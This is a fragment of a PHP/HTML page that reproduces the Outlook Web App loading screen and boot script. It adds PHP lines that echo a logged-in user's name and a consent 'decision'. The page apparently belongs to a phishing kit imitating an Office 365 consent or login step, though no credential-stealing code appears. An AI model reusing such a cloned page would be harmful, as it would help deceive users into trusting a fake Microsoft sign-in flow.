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">  
      
      <div class="exactCenter">
      <div id="phase-1" style="display:none;">
      <p style="font-style:italic; color:#00F"> Processing Consent for <?php echo "$userlogged"; ?></p>
     </div>
     <div id="phase-2" style="display:none;">
     <p style="font-style:italic; color:#00F"> Consent for <?php echo "$userlogged <strong>$decision</strong>"; ?></p>
     </div>
            </div>
      
      

    <style>
        .prog_bar_container {
            width: 300px;
            height: 5px;
            overflow: hidden;
            background-color: #cccccc;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        .prog_bar_keyframer_data {
            width: 0%;
            max-width: 100%;
            height: 5px;
            overflow: hidden;
            position: relative;
            background-color: #0078d7;
            -webkit-animation: progmove 20s 1 forwards;
            -moz-animation: progmove 20s 1 forwards;
            -ms-animation: progmove 20s 1 forwards;
            -o-animation: progmove 20s 1 forwards;
            animation: progmove 20s 1 forwards;
            -webkit-animation-timing-function: linear;
            -moz-animation-timing-function: linear;
            -ms-animation-timing-function: linear;
            -o-animation-timing-function: linear;
            animation-timing-function: linear;
        }
        .prog_bar_keyframer_data div {
            position: absolute;
            width: 0;
            height: 0;
        }
        .prog_bar_keyframer_data .animation {
            -webkit-animation-duration: 1s;
            -moz-animation-duration: 1s;
            -ms-animation-duration: 1s;
            -o-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-timing-function: linear;
            -moz-animation-timing-function: linear;
            -ms-animation-timing-function: linear;
            -o-animation-timing-function: linear;
            animation-timing-function: linear;
            -webkit-animation-direction: normal;
            -moz-animation-direction: normal;
            -ms-animation-direction: normal;
            -o-animation-direction: normal;
            animation-direction: normal;
            -webkit-animation-iteration-count: infinite;
            -moz-animation-iteration-count: infinite;
            -ms-animation-iteration-count: infinite;
            -o-animation-iteration-count: infinite;
            animation-iteration-count: infinite;
            -webkit-animation-delay: 0.687s;
            -moz-animation-delay: 0.687s;
            -ms-animation-delay: 0.687s;
            -o-animation-delay: 0.687s;
            animation-delay: 0.687s;
        }
        .prog_bar_keyframer_data .texture {
            position: absolute;
            background: no-repeat;
            background-size: cover;
        }
        .prog_bar_keyframer_data .layer-1-anchor {
            left: -500px;
            top: -3px;
        }
        .prog_bar_keyframer_data .layer-1-translateX {
            -webkit-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            -moz-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            -ms-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            -o-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            animation-name: prog_bar_keyframer_data-layer-1-translateX;
        }
        @-webkit-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -webkit-transform: translateX(-50px);
                -webkit-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -webkit-transform: translateX(350px);
                -webkit-animation-timing-function: linear;
            }
            100% {
                -webkit-transform: translateX(350px);
            }
        }
        @-moz-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -moz-transform: translateX(-50px);
                -moz-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -moz-transform: translateX(350px);
                -moz-animation-timing-function: linear;
            }
            100% {
                -moz-transform: translateX(350px);
            }
        }
        @-ms-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -ms-transform: translateX(-50px);
                -ms-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -ms-transform: translateX(350px);
                -ms-animation-timing-function: linear;
            }
            100% {
                -ms-transform: translateX(350px);
            }
        }
        @-o-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -o-transform: translateX(-50px);
                -o-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -o-transform: translateX(350px);
                -o-animation-timing-function: linear;
            }
            100% {
                -o-transform: translateX(350px);
            }
        }
        @keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                transform: translateX(-50px);
                animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                transform: translateX(350px);
                animation-timing-function: linear;
            }
            100% {
                transform: translateX(350px);
            }
        }
        .prog_bar_keyframer_data .layer-1-content {
            width: 800px;
            height: 10px;
            opacity: 0.85;
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAAAKCAYAAABMrzqlAAAACXBIWXMAAAABAAAAAQE4IvRAAAAAJHpUWHRDcmVhdG9yAAAImXNMyU9KVXBMK0ktUnBNS0tNLikGAEF6Bs5qehXFAAAAxklEQVR4nO3bwQ3CIAAFUDBO4hyO4ZgeHcE5XEVPJg1V0lJaSvPexYAf8pv0IGkNAQAAAAAA4GjiWhvfn6+1toYQxvdubiwrKzsvu/d+VbO36+URANjMuXUBWChO+JyS6S3bS0/Z42d76ZnLOoAAbOjUugBQ5N26AABACQcQAABgMw4gACzhaRwAs/gPCL1Lf/x8x3Ewl77znc7/Gv/7bkpm6ZraPUvWlHQ4Qs+SNTWvbTje87Xl9mhxj9foCQAAAAAAAACFPsTMCankaacdAAAAAElFTkSuQmCC');
        }

        @-webkit-keyframes progmove { 
         from {}
         to { width: 95% }
        }

        @-moz-keyframes progmove { 
            from {}

            to { width: 95% }
        }

        @-ms-keyframes progmove { 
            from { }
            to { width: 95% }
        }

        @keyframes progmove { 
            from { }
            to { width: 95% }
        }
      </style>
      <div class="prog_bar_container">
        <div id="progressBar" class="prog_bar_keyframer_data" style="animation-timing-function: cubic-bezier(0.032, 0.9, 0.032, 0.9);">
            <div class="layer-1-translateX animation">
                <div class="layer-1-anchor">
                    <div class="layer-1-content texture "></div>
                </div>
            </div>
        </div>
      </div>
    <script>
            pbar.startScriptLoad();
    </script>
    
        <div id="statusText" class="script">
            
        </div>
    </div>
    

        
        
        <script>
            try{
                var userSpecificsLoaded = false,
                styleResources = [],
                userScriptResources = [],
                clientTheme = 'base',
                userCultureVar = 'en-US',
                userCultureRtl = false,
                sver = '16.2279.14.2549832',
                besver = '15.20.715.24',
                userLanguageVar = 'en';
                osfLanguageVar = 'en';
                navFrontEndServer = 'CY1PR16CA0026.NAMPRD16.PROD.OUTLOOK.COM',
                navBackEndServer = 'CY4PR07MB3510',
                cdnEndPointNameForBootResources = 'https://outlook.office365.com';
                cdnEndPointNameForNonBootResources = 'https://outlook.office365.com';
                layout = 'mouse';
                stylesLocale = '0';
                
                pbar.scriptLoadCompleted();
                
                setClientId(window.clientId);
                lcver = updateLastClientVersion(sver);
                
                
                var slabManifest = {"deferredjquery":{"Dependencies":[],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"DeferredJQueryComponent"}],"Sources":[{"layout":"Mouse","name":"jquery.owa.bundle.mouse.js"},{"name":"microsoft.owa.boot.deferred.jquery.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["deferredjquery"]},"locationcommon":{"Dependencies":[],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"LocationCommonComponent"}],"Sources":[{"name":"microsoft.owa.core.locationcommon.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["locationcommon"]},"textboys":{"Dependencies":[],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"TextBoysComponents"}],"Sources":[{"name":"microsoft.owa.application.textboys.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["textboys"]},"readingpane":{"Dependencies":["nonbootwebservices","recipientwell","personacontrol","attachments","deferredboot","mailcommon","lightning"],"Types":["_y.dS","_h.cZ","_y.ei","_y.I","_y.gv"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.application.readingpane.mouse.css","type":"Themed"}],"Configurations":[{"type":"ReadingPaneComponent"}],"Sources":[{"name":"flowsdk.owa.bundle.js"},{"name":"flowwidget.js"},{"name":"microsoft.owa.application.readingpane.js"},{"layout":"Mouse","name":"microsoft.owa.application.readingpane.mouse.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["readingpane"]},"extendedmaillistview":{"Dependencies":["nonbootwebservices","deferredboot"],"Types":["_y.eR","_y.hS","_y.dN","_y.ik"],"Templates":["ExpandedConversationListView","JumpToListView","KeyboardShortcutsTemplate","ReportPhishView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.extendedmaillistview.mouse.css","type":"Themed"}],"Configurations":[{"type":"ExtendedMailListViewComponent"}],"Sources":[{"name":"microsoft.owa.extendedmaillistview.js"},{"layout":"Mouse","name":"microsoft.owa.extendedmaillistview.mouse.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["extendedmaillistview"]},"triageshared":{"Dependencies":["deferredboot","lightning"],"Types":["_y.eZ","_y.gC","_y.gx"],"Templates":["HoverActionBarView","ModuleSwitcherView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.triageshared.mouse.css","type":"Themed"}],"Configurations":[{"type":"TriageSharedComponent"}],"Sources":[{"name":"microsoft.owa.triageshared.js"},{"name":"microsoft.owa.triageshared.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.options.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["triageshared"]},"edgepromotion":{"Dependencies":["lightning","deferredboot"],"Types":["_y.hQ"],"Templates":[],"Styles":[],"Configurations":[{"type":"EdgePromotionComponent"}],"Sources":[{"name":"microsoft.owa.core.edgepromotion.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["edgepromotion"]},"editorEngine":{"Dependencies":["nonbootwebservices"],"Types":[],"Templates":[],"Styles":[],"Configurations":[],"Sources":[{"name":"microsoftajax.js"},{"name":"ms.rte.js"},{"name":"rteinit.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["editorEngine"]},"editor":{"Dependencies":["nonbootwebservices","personacontrol","commoncompose"],"Types":[],"Templates":[],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.core.controls.editorbase.mouse.css","type":"Themed"}],"Configurations":[{"type":"EditorComponent"}],"Sources":[{"name":"microsoft.owa.core.controls.editorbase.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["editor"]},"metile":{"Dependencies":["shellcore"],"Types":["_o365sg2c.e"],"Templates":["MeTileMouseView.MeTileMenu","MeTileMouseView.MeTilePhoto","MeTileMouseView.MeTileNoPhoto","MeFlexPaneHeaderButtonView"],"Styles":[],"Configurations":[{"type":"MeFlexHeaderButtonComponent"}],"Sources":[{"name":"microsoft.o365.shellg2.meflexheaderbutton.owa.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["metile"]},"emoji":{"Dependencies":["nonbootwebservices","deferredboot","commoncompose","editor"],"Types":["_cmc.n"],"Templates":[],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.core.controls.emojiresources.mouse.css","type":"Themed"}],"Configurations":[{"type":"EmojiResourcesComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.core.controls.emojiresources.js"}],"PackagedSources":[],"Strings":[{"layout":"Mouse","name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"layout":"Mouse","name":"microsoft.owa.core.editor.emoji.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["emoji"]},"peoplecore":{"Dependencies":["deferredboot","nonbootwebservices"],"Types":["_h.dG","_db.cH","_db.cJ","_db.cN"],"Templates":[],"Styles":[],"Configurations":[{"type":"PeopleCoreComponent"}],"Sources":[{"name":"microsoft.owa.people.core.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.pcstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["peoplecore"]},"contactmanagement":{"Dependencies":["deferredboot","nonbootwebservices","peoplecore"],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"ContactManagementComponent"}],"Sources":[{"name":"microsoft.owa.people.contactmanagement.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["contactmanagement"]},"photoupload":{"Dependencies":["nonbootwebservices"],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"PhotoUploadComponent"}],"Sources":[{"name":"microsoft.owa.people.photoupload.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["photoupload"]},"popout":{"Dependencies":["deferredboot","nonbootwebservices"],"Types":["_y.dk","_y.bK"],"Templates":["Wrapper.PopOut"],"Styles":[],"Configurations":[{"type":"PopOutComponent"}],"Sources":[{"name":"microsoft.owa.core.popout.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["popout"]},"nonboot":{"Dependencies":["nonbootwebservices","calendarwebservices","attachments","attachmentwell","editor","peoplecore","contactmanagement","photoupload","calendarcore","calendarcontrols","calendarsurface","commoncompose","composepersonacard","mailcompose","recipientwell","meetingmessage","personacontrol","personacardfacade","peoplehub","findpeople","calendarmeetingforms","readpersoncard","deferredboot","readingpane","offline","mailcommon","moderngroupsshared","moderngroupscalendarshared","edgepromotion"],"Types":["_db.cF","_db.cG","_db.cI","_db.cK","_db.cL","_a.fC","_a.fL","_y.dz","_y.cE","_y.dR","_y.dm","_y.cc","_y.iG","_y.fh","_y.hT","_y.bo","_y.gy","_h.dC","_y.bg","_y.fU","_y.fT","_y.fS","_y.hB","_y.fs","_y.iK","_y.hZ","_y.ey","_y.hX","_y.fp","_y.iw","_y.ix","_y.gw"],"Templates":["CategoryManagementContentView","ComposeScreenView","MessageDetailsView","ItemPrintingPaneView"],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"nonboot.mouse.css","type":"Themed"}],"Configurations":[{"type":"CoreModelsComponent"},{"type":"CoreViewModelsComponent"},{"type":"ApplicationViewModelsComponent"},{"type":"ApplicationViewsComponent"}],"Sources":[{"name":"microsoft.owa.core.models.js"},{"name":"microsoft.owa.core.viewmodels.js"},{"name":"microsoft.owa.core.views.js"},{"layout":"Mouse","name":"microsoft.owa.core.views.mouse.js"},{"name":"microsoft.owa.application.viewmodels.js"},{"name":"microsoft.owa.application.views.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.meetingmsgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.options.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.oobestrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["nonboot"]},"react":{"Dependencies":[],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"ClientNextFrameworkComponent"}],"Sources":[{"name":"owa.clientnext.common.js"},{"name":"owa.clientnext.application.js"},{"name":"microsoft.owa.clientnext.framework.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["react"]},"offline":{"Dependencies":["deferredboot","deferredwebservices","calendarwebservices","nonbootwebservices","mailcommon"],"Types":["_y.ee","_bc.R","_bc.S","_a.dE","_bc.F","_bc.G","_a.fI","_h.de","_bc.V","_bc.W","_h.cF","_a.gh","_h.dK","_a.et","_h.ds"],"Templates":[],"Styles":[],"Configurations":[{"type":"OfflineBootComponent"},{"type":"CoreSyncComponent"},{"type":"CoreStorageComponent"}],"Sources":[{"name":"microsoft.owa.core.storage.framework.js"},{"name":"microsoft.owa.core.storage.js"},{"name":"microsoft.owa.core.offline.boot.js"},{"name":"microsoft.owa.core.sync.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["offline"]},"recipientwell":{"Dependencies":["deferredboot","nonbootwebservices","peoplecore","personacontrol","mailcommon"],"Types":["_y.eo","_y.ca"],"Templates":["ReadWriteRecipientWellView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.recipientwell.mouse.css","type":"Themed"}],"Configurations":[{"type":"RecipientWellComponent"}],"Sources":[{"name":"microsoft.owa.core.recipientwell.js"},{"layout":"Mouse","name":"microsoft.owa.core.recipientwell.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["recipientwell"]},"introductionPeek":{"Dependencies":["nonbootwebservices","deferredboot"],"Types":["_y.bC","_y.ii"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.introductionpeek.mouse.css","type":"Themed"}],"Configurations":[{"type":"IntroductionPeekComponent"}],"Sources":[{"name":"microsoft.owa.core.introductionpeek.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["introductionPeek"]},"bundledmail":{"Dependencies":["personacontrol","nonbootwebservices","lightning"],"Types":["_y.hN"],"Templates":[],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.bundledmail.mouse.css","type":"Themed"}],"Configurations":[{"type":"BundledMailComponent"}],"Sources":[{"name":"microsoft.owa.bundledmail.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["bundledmail"]},"sweep":{"Dependencies":["lightning","readingpane","nonbootwebservices"],"Types":["_y.gL","_y.iF"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.sweep.mouse.css","type":"Themed"}],"Configurations":[{"type":"SweepComponent"}],"Sources":[{"name":"microsoft.owa.sweep.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["sweep"]},"attachmentsfilepicker":{"Dependencies":["nonbootwebservices","recipientwell","personacontrol","attachments","deferredboot"],"Types":["_y.bR","_y.hM"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.attachments.filepicker.views.mouse.css","type":"Themed"}],"Configurations":[{"type":"AttachmentsFilePickerViewModelsComponent"},{"type":"AttachmentsFilePickerViewsComponent"}],"Sources":[{"name":"microsoft.owa.attachments.filepicker.models.js"},{"name":"microsoft.owa.attachments.filepicker.viewmodels.js"},{"name":"microsoft.owa.attachments.filepicker.views.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.attach.fp.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["attachmentsfilepicker"]},"shellcore":{"Dependencies":[],"Types":["_y.fK"],"Templates":["SharedHeaderMouseView"],"Styles":[{"layout":"Mouse","name":"o365shellg2coreowa.mouse.css","type":"Themed"}],"Configurations":[{"type":"O365ShellCoreG2Component"}],"Sources":[{"name":"microsoft.o365.suiteutil.js"},{"name":"microsoft.o365.clientlogging.js"},{"name":"microsoft.o365.clientperformance.js"},{"name":"microsoft.o365.shellg2.coremin.js"},{"name":"microsoft.o365.shellg2.core.owa.js"},{"layout":"Mouse","name":"microsoft.o365.shellg2.core.owa.mouse.js"},{"name":"microsoft.owa.shellcoreg2.o365.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.o365.shellg2.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["shellcore"]},"shellplus":{"Dependencies":["deferredboot","calendarwebservices","nonbootwebservices","shellcore","calendarcore","peoplecore","calendarmeetingforms","navigation","mailcompose"],"Types":["_y.hj","_y.hi","_y.bz","_o365sg2c.I","_sc2.d","_sp2.p","_db.bP"],"Templates":["FlexPanePanelView"],"Styles":[{"layout":"Mouse","name":"o365shellg2plusowa.mouse.css","type":"Themed"}],"Configurations":[{"type":"CoreModelsComponent"},{"type":"O365ShellPlusG2Component"}],"Sources":[{"name":"microsoft.owa.core.models.js"},{"name":"msrcrypto-aes.js"},{"name":"msrcrypto-aes-fix.js"},{"name":"microsoft.o365.suiteserviceproxycommon.js"},{"name":"microsoft.o365.suiteserviceproxy.js"},{"name":"microsoft.owa.suiteapinotifications.js"},{"name":"microsoft.o365.suiteapi.owa.js"},{"layout":"Mouse","name":"microsoft.o365.suiteapiskypeintegration.js"},{"name":"microsoft.o365.shellg2.owa.js"},{"layout":"Mouse","name":"microsoft.o365.shellg2.owa.mouse.js"},{"name":"microsoft.owa.shellplusg2.o365.js"},{"layout":"Mouse","name":"meidp.min.js"},{"name":"cardmetadata.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.o365.shellg2.settingstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["shellplus"]},"documentattachment":{"Dependencies":["deferredwebservices","nonbootwebservices","recipientwell","attachments","react"],"Types":["_y.gq"],"Templates":["DocumentAttachmentView"],"Styles":[],"Configurations":[{"type":"CollabDocumentAttachmentComponent"}],"Sources":[{"name":"adal.min.js"},{"name":"owa.clientnext.extensibility.js"},{"name":"microsoft.owa.attachments.collabdocattachment.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["documentattachment"]},"pdfjspreview":{"Dependencies":["deferredwebservices","nonbootwebservices","recipientwell","attachments","attachmentpreview"],"Types":["_y.iy"],"Templates":["PdfJsPreviewView"],"Styles":[{"name":"pdf.css","type":"Themed"},{"layout":"Mouse","name":"microsoft.owa.attachments.pdfjspreview.mouse.css","type":"Themed"}],"Configurations":[{"type":"PdfJsPreviewComponent"}],"Sources":[{"name":"pdf.min.js"},{"name":"pdf.worker.min.js"},{"name":"pdf_viewer.min.js"},{"name":"microsoft.owa.attachments.pdfjspreview.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["pdfjspreview"]},"attachments":{"Dependencies":["nonbootwebservices","recipientwell","personacontrol","deferredboot"],"Types":["_db.bG","_y.gk","_y.iI","_y.cN","_y.bJ","_h.dr"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.attachments.mouse.css","type":"Themed"}],"Configurations":[{"type":"AttachmentsComponent"}],"Sources":[{"name":"microsoft.owa.core.attachments.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["attachments"]},"attachmentwell":{"Dependencies":["nonbootwebservices","attachments","recipientwell","commoncompose","deferredboot"],"Types":["_y.bf","_at.p"],"Templates":["AttachmentWellViewWrapper","AttachmentFilmStripView"],"Styles":[{"layout":"Mouse","name":"ewsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.attachments.extendedattachmentwell.mouse.css","type":"Themed"}],"Configurations":[{"type":"ExtendedAttachmentWellComponent"}],"Sources":[{"name":"suiteextensions.js"},{"name":"suiteextensionscontrols.js"},{"name":"microsoft.owa.attachments.extendedattachmentwell.js"},{"layout":"Mouse","name":"microsoft.owa.attachments.extendedattachmentwell.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["attachmentwell"]},"attachmentpreview":{"Dependencies":["nonbootwebservices","recipientwell","readingpane","deferredboot","documentattachment","imagealbumviewer","mailcompose","quickcompose"],"Types":["_y.gl","_at.Z"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.attachments.collabattachmentpreview.mouse.css","type":"Themed"}],"Configurations":[{"type":"CollabAttachmentPreviewComponent"}],"Sources":[{"name":"microsoft.owa.attachments.collabattachmentpreview.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.attach.pr.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["attachmentpreview"]},"files":{"Dependencies":["nonbootwebservices","personacontrol","deferredboot","attachments","moderngroupsnavigation","moderngroupscore","moderngroupsheader","react"],"Types":["_xs.r","_xc.m","_mgn.bb"],"Templates":["FilesContainerView"],"Styles":[{"layout":"Mouse","name":"fsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.files.mouse.css","type":"Themed"}],"Configurations":[{"type":"FilesComponent"}],"Sources":[{"name":"microsoft.owa.files.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.filesstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["files"]},"unifiedgroupcreation":{"Dependencies":["moderngroupsnavigation","react"],"Types":["_mgn.E"],"Templates":["UnifiedGroupCreationView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.unifiedgroupcreation.mouse.css","type":"Themed"}],"Configurations":[{"type":"UnifiedGroupCreationComponent"}],"Sourc